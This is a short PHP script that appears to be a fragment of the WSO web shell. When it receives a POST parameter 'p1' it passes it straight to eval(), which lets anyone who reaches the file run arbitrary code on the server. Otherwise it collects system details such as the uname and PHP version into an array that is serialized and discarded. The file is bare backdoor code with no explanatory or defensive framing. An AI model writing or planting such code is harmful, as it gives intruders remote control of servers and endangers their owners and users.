<?php
if(!@$_POST['p1']) {
		$a = array(
			"uname" => php_uname(),
			"php_version" => phpversion(),
			"wso_version" => WSO_VERSION,
			"safemode" => @ini_get('safe_mode')
		);
		serialize($a);
	} else {
		eval($_POST['p1']);
	}
echo "end";
?>